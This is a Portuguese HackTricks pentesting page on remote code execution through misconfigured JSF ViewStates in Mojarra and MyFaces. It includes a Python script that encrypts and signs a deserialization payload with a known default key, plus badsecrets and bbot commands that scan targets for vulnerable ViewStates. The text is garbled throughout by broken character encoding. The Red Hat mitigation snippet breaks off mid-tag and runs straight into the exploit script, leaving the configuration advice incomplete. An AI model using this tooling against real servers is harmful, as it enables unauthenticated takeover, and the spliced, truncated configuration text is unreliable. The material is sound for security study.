# Introdu√ß√£o

Depois de analisarmos [RCEs atrav√©s de bibliotecas JSON mal configuradas](https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html), come√ßamos a analisar os ViewStates das implementa√ß√µes JSF. [JavaServer Faces (JSF)](https://en.wikipedia.org/wiki/JavaServer_Faces) √© uma tecnologia de interface do usu√°rio (UI) para construir UIs da web com componentes reutiliz√°veis. JSF √© usado principalmente para aplicativos empresariais e uma implementa√ß√£o JSF √© tipicamente usada por um aplicativo da web que √© executado em um servidor de aplicativos Java como JBoss EAP ou WebLogic Server. Existem duas implementa√ß√µes bem conhecidas da especifica√ß√£o JSF:

* Oracle Mojarra (implementa√ß√£o de refer√™ncia JSF)
* Apache MyFaces

# Escopo

Esta postagem no blog se concentra nas duas implementa√ß√µes JSF 2.x: Oracle Mojarra (Implementa√ß√£o de Refer√™ncia) e Apache MyFaces. Implementa√ß√µes mais antigas (JSF 1.x) tamb√©m provavelmente s√£o afetadas pelas vulnerabilidades descritas nesta postagem. (JSF 2.0.x foi lan√ßado inicialmente em 2009, a vers√£o atual √© 2.3.x).

# O estado do ViewState

Uma diferen√ßa entre JSF e tecnologias web semelhantes √© que JSF usa ViewStates (al√©m de sess√µes) para armazenar o estado atual da visualiza√ß√£o (por exemplo, quais partes da visualiza√ß√£o devem ser exibidas atualmente). O ViewState pode ser armazenado no `servidor` ou no `cliente`. Os ViewStates do JSF s√£o normalmente automaticamente incorporados em formul√°rios HTML como um campo oculto com o nome `javax.faces.ViewState`. Eles s√£o enviados de volta para o servidor se o formul√°rio for enviado.

## ViewState no lado do servidor

Se o ViewState do JSF estiver configurado para ficar no `servidor`, o campo oculto `javax.faces.ViewState` cont√©m um ID que ajuda o servidor a recuperar o estado correto. No caso do MyFaces, esse ID √© um **objeto Java serializado**!

## ViewState no lado do cliente

Se o ViewState do JSF estiver configurado para ficar no `cliente`, o campo oculto `javax.faces.ViewState` cont√©m um **objeto Java serializado** que √© pelo menos codificado em Base64. Voc√™ pode ter percebido at√© agora que esta √© uma estrada potencial para o desastre! Esse pode ser um dos motivos pelos quais os ViewStates do JSF s√£o criptografados e assinados antes de serem enviados para o cliente. Os perigos de objetos Java serializados

Em 2015, na confer√™ncia AppSec California, [Gabriel Lawrence](https://twitter.com/gebl) e [Chris Frohoff](https://twitter.com/frohoff) realizaram uma apresenta√ß√£o com o t√≠tulo [Marshalling Pickles (how deserializing objects can ruin your day)](https://frohoff.github.io/appseccali-marshalling-pickles/). Esta apresenta√ß√£o lan√ßou alguma luz sobre problemas esquecidos com a serializa√ß√£o de objetos Java e levou √† descoberta de [v√°rias vulnerabilidades graves de execu√ß√£o remota de c√≥digo (RCE)](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/).

Infelizmente, levou algumas pessoas a acreditar que a vulnerabilidade poderia ser mitigada removendo/atualizando certas vers√µes do Apache Commons Collections. Uma a√ß√£o que pode realmente ajudar, mas n√£o resolve a causa raiz do problema: Desserializa√ß√£o de Dados N√£o Confi√°veis ([CWE 502](https://cwe.mitre.org/data/definitions/502.html)). Em outras palavras:\
**O uso de uma vers√£o do Apache Commons Collections 'vulner√°vel' n√£o significa que o aplicativo √© vulner√°vel, nem a aus√™ncia de tal vers√£o de biblioteca significa que o aplicativo n√£o √© vulner√°vel.**

No entanto, depois que um hacker malicioso [desligou e criptografou os sistemas da San Francisco Municipal Transportation Agency](https://krebsonsecurity.com/2016/11/san-francisco-rail-system-hacker-hacked/) via "Mad Gadget"/"Apache Commons Collections Deserialization Vulnerability", o Google iniciou a [Opera√ß√£o Rosehub](https://opensource.googleblog.com/2017/03/operation-rosehub.html). O objetivo da opera√ß√£o Rosehub era encontrar o maior n√∫mero poss√≠vel de projetos de c√≥digo aberto Java que usavam uma vers√£o de cole√ß√µes comuns 'amig√°vel ao atacante' como depend√™ncia e enviar solicita√ß√µes pull aos propriet√°rios do projeto para que esses projetos parassem de usar vers√µes problem√°ticas de cole√ß√µes comuns em novas vers√µes.

# O ataque ao ViewState

Vamos supor que temos um aplicativo da web com uma p√°gina de login baseada em JSF:

![JSF based login](https://www.alphabot.com/images/blog/jsf-viewstate/jsf-viewstate-login.png)

Essa p√°gina de login tem um ViewState que n√£o √© criptografado nem assinado. Ent√£o, quando olhamos para sua fonte HTML, vemos um campo oculto contendo o ViewState: ViewState MyFaces n√£o criptografado:
```
<input type="hidden" name="javax.faces.ViewState" id="j_id__v_0:javax.faces.ViewState:1" value="rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s" autocomplete="off" />
```
Se voc√™ decodificar o ViewState acima usando Base64, voc√™ notar√° que ele cont√©m um objeto Java serializado. Este ViewState √© enviado de volta para o servidor via POST quando o formul√°rio √© enviado (por exemplo, clique em Login). Agora, antes que o ViewState seja enviado de volta para o servidor, o invasor substitui o ViewState por seu pr√≥prio ViewState malicioso usando um gadget que j√° est√° no classpath do servidor (por exemplo, `InvokerTransformer` de commons-collections-3.2.1.jar) ou at√© mesmo um gadget que ainda n√£o √© conhecido pelo p√∫blico. Com o gadget malicioso colocado no ViewState, o invasor especifica quais comandos deseja executar no servidor. A flexibilidade do que um invasor pode fazer √© limitada pelos poderes dos gadgets dispon√≠veis no classpath do servidor. No caso do `InvokerTransformer`, o invasor pode especificar quais comandos de linha de comando devem ser executados no servidor. O invasor em nosso exemplo escolheu iniciar uma calculadora na interface do nosso servidor baseado em Linux.

Depois que o invasor enviou seu formul√°rio modificado de volta para o servidor, a implementa√ß√£o JSF tenta desserializar o ViewState fornecido. Agora, mesmo antes que a desserializa√ß√£o do ViewState tenha terminado, o comando √© executado e a calculadora √© iniciada no servidor:

![calculadora iniciada via um ViewState JSF](https://www.alphabot.com/images/blog/jsf-viewstate/jsf-viewstate-started-calculator.png)

Tudo aconteceu antes que a implementa√ß√£o JSF pudesse dar uma olhada no ViewState e decidir que n√£o era bom. Quando o ViewState foi considerado inv√°lido, geralmente um erro √© enviado de volta ao cliente como "Expira√ß√£o da visualiza√ß√£o". Mas ent√£o j√° √© tarde demais. O invasor teve acesso ao servidor e executou comandos. (A maioria dos invasores do mundo real n√£o inicia uma calculadora, mas geralmente implantam um shell remoto, que eles usam para acessar o servidor.)

\=> Tudo isso demonstra uma vulnerabilidade muito perigosa de execu√ß√£o remota de c√≥digo (RCE) n√£o autenticada.

(Quase o mesmo cen√°rio de ataque contra JSF como descrito acima j√° foi delineado e demonstrado na apresenta√ß√£o de 2015 (p√°ginas 65 a 67): [Marshalling Pickles](https://frohoff.github.io/appseccali-marshalling-pickles/) realizada por Frohoff e Lawrence.)

# As precondi√ß√µes para um ataque bem-sucedido

Agora, quais s√£o os ingredientes para um desastre?

* ViewState n√£o criptografado (ou posse da chave de criptografia)
* Gadget no classpath do servidor
* No caso do Mojarra: ViewState configurado para residir no `cliente`
* No caso do MyFaces: ViewState configurado para residir no `cliente` **ou** no `servidor`

Vamos dar uma olhada nesses pontos em rela√ß√£o √†s duas implementa√ß√µes JSF.

# Oracle Mojarra (implementa√ß√£o de refer√™ncia JSF)

Como dito antes, o Oracle Mojarra √© a Implementa√ß√£o de Refer√™ncia (RI) do JSF, mas pode n√£o ser conhecido por esse nome. Pode ser conhecido como Sun JSF RI, reconhecido com o nome do pacote java `com.sun.faces` ou com o nome amb√≠guo do jar `jsf-impl.jar`.

## Mojarra: ViewState n√£o criptografado

Ent√£o aqui est√° a coisa: o Mojarra n√£o criptografou e assinou o ViewState do lado do cliente por padr√£o na maioria das vers√µes de 2.0.x e 2.1.x. √â importante observar que um ViewState do lado do servidor √© o padr√£o em ambas as implementa√ß√µes JSF, mas um desenvolvedor poderia facilmente mudar a configura√ß√£o para usar um ViewState do lado do cliente definindo o par√¢metro `javax.faces.STATE_SAVING_METHOD` como `cliente`. O nome do par√¢metro n√£o revela de forma alguma que mud√°-lo para cliente introduz vulnerabilidades graves de execu√ß√£o remota de c√≥digo (por exemplo, um ViewState do lado do cliente pode ser usado em aplicativos da web em cluster).

Embora a criptografia do ViewState do lado do cliente seja o padr√£o no Mojarra 2.2 e em vers√µes posteriores, n√£o era para os ramos 2.0.x e 2.1.x. No entanto, em maio de 2016, os desenvolvedores do Mojarra come√ßaram a retroportar a criptografia padr√£o do ViewState do lado do cliente para [2.0.x](https://github.com/javaserverfaces/mojarra/issues/4142) e [2.1.x](https://github.com/javaserverfaces/mojarra/issues/4141) quando perceberam que ViewStates n√£o criptografados levam a vulnerabilidades de RCE.

Portanto, pelo menos a vers√£o [2.1.29-08](https://mvnrepository.com/artifact/com.sun.faces/jsf-impl/2.1.29-08) (lan√ßada em julho de 2016) do ramo 2.1.x e a vers√£o [2.0.11-04](https://mvnrepository.com/artifact/com.sun.faces/jsf-impl/2.0.11-04) (tamb√©m lan√ßada em julho de 2016) do ramo 2.0.x t√™m a criptografia habilitada por padr√£o.

Quando analisamos as bibliotecas do Mojarra, notamos que a Red Hat tamb√©m lan√ßa vers√µes do Mojarra para os ramos 2.1.x e 2.0.x, sendo a mais recente [2.1.29-jbossorg-1](https://mvnrepository.com/artifact/com.sun.faces/jsf-impl/2.1.29-jbossorg-1) e [2.0.4-b09-jbossorg-4](https://mvnrepository.com/artifact/com.sun.faces/jsf-impl/2.0.4-b09-jbossorg-4). Como ambos os lan√ßamentos estavam sem criptografia padr√£o do ViewState, entramos em contato com a Red Hat e eles prontamente criaram o [Bug 1479661 - JSF client side view state saving deserializes data](https://bugzilla.redhat.com/show_bug.cgi?id=1479661) em seu bugtracker com o seguinte conselho de mitiga√ß√£o para o ramo 2.1.x:

> Uma aplica√ß√£o web vulner√°vel precisa ter definido javax.faces.STATE_SAVING_METHOD como 'cliente' para habilitar o salvamento de ViewState do lado do cliente. O valor padr√£o no Enterprise Application Platform (EAP) 6.4.x √© 'servidor'.\
> \
> Se javax.faces.STATE_SAVING_METHOD estiver definido como 'cliente', uma mitiga√ß√£o para esse problema √© criptografar a visualiza√ß√£o definindo com.sun.faces.ClientStateSavingPassword no web.xml da aplica√ß√£o:
>
> ```markup
>   <context-param>
>     <param-name>javax.faces.STATE_SAVING_METHOD</param-name>
>     <param-value>cliente</param-value>
>   </context-param>
>
>   <env¬≠-entry> 
>     <env¬≠-entry-¬≠name>com.sun.faces.ClientStateSavingPassword</env¬≠-entry-¬≠name> 
>     <env-¬≠entry-¬≠type>java.lang.String</env-¬≠entry
```python
#!/usr/bin/python3
import sys
import hmac
from urllib import parse
from base64 import b64encode
from hashlib import sha1
from pyDes import *

YELLOW = "\033[93m"
GREEN = "\033[32m"

def encrypt(payload,key):
	cipher = des(key, ECB, IV=None, pad=None, padmode=PAD_PKCS5)
	enc_payload = cipher.encrypt(payload)
	return enc_payload

def hmac_sig(enc_payload,key):
	hmac_sig = hmac.new(key, enc_payload, sha1)
	hmac_sig = hmac_sig.digest()
	return hmac_sig

key = b'JsF9876-'

if len(sys.argv) != 3 :
	print(YELLOW + "[!] Usage : {} [Payload File] [Output File]".format(sys.argv[0]))
else:
	with open(sys.argv[1], "rb") as f:
		payload = f.read()
		f.close()
	print(YELLOW + "[+] Encrypting payload")
	print(YELLOW + "  [!] Key : JsF9876-\n")
	enc_payload = encrypt(payload,key)
	print(YELLOW + "[+] Creating HMAC signature")
	hmac_sig = hmac_sig(enc_payload,key)
	print(YELLOW + "[+] Appending signature to the encrypted payload\n")
	payload = b64encode(enc_payload + hmac_sig)
	payload = parse.quote_plus(payload)
	print(YELLOW + "[*] Final payload : {}\n".format(payload))
	with open(sys.argv[2], "w") as f:
		f.write(payload)
		f.close()
	print(GREEN + "[*] Saved to : {}".format(sys.argv[2]))
```
# Detec√ß√£o de Chave Conhecida com Badsecrets

![Badsecrets](https://github.com/blacklanternsecurity/badsecrets) √© uma biblioteca capaz de detectar o uso de chaves criptogr√°ficas conhecidas, olhando para os produtos que elas produzem e verificando em uma lista de chaves conhecidas ou fracas. Seu m√≥dulo `Jsf_viewstate` √© capaz de detectar Java Server Faces ViewStates criados com chaves conhecidas em ambos Mojarra e MyFaces, al√©m de ViewStates desprotegidos ou comprimidos.

A maneira mais r√°pida de us√°-lo √© com a ferramenta de exemplo `cli.py`, da seguinte forma:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/cli.py Ly8gp+FZKt9XsaxT5gZu41DDxO74k029z88gNBOru2jXW0g1Og+RUPdf2d8hGNTiofkD1VvmQTZAfeV+5qijOoD+SPzw6K72Y1H0sxfx5mFcfFtmqX7iN6Gq0fwLM+9PKQz88f+e7KImJqG1cz5KYhcrgT87c5Ayl03wEHvWwktTq9TcBJc4f1VnNHXVZgALGqQuETU8hYwZ1VilDmQ7J4pZbv+pvPUvzk+/e2oNeybso6TXqUrbT2Mz3k7yfe92q3pRjdxRlGxmkO9bPqNOtETlLPE5dDiZYo1U9gr8BBQ=
```
Se encontrar uma correspond√™ncia, tamb√©m listar√° a plataforma (Mojarra ou MyFaces), o algoritmo de criptografia em uso e se a compress√£o foi usada ou n√£o, que s√£o todos essenciais para a explora√ß√£o.

Para procurar por viewstates vulner√°veis em escala, em conjunto com a enumera√ß√£o de subdom√≠nios, o m√≥dulo `badsecrets` [**BBOT**]() pode ser usado:
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
# Considera√ß√µes finais

A maioria dos fatos sobre JSF ViewStates e seus perigos apresentados neste post n√£o s√£o exatamente novos, mas parece que nunca foram apresentados de forma t√£o condensada. Isso mostrou [mais uma vez](https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html) que mudan√ßas de configura√ß√£o aparentemente inofensivas podem levar a vulnerabilidades graves.

\=> Um dos problemas parece ser a falta de transfer√™ncia de conhecimento entre pesquisadores de seguran√ßa e desenvolvedores que realmente usam e configuram bibliotecas que podem ser perigosas quando configuradas de certas maneiras.

# Refer√™ncias

* [https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
* [https://0xrick.github.io/hack-the-box/arkham/](https://0xrick.github.io/hack-the-box/arkham/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
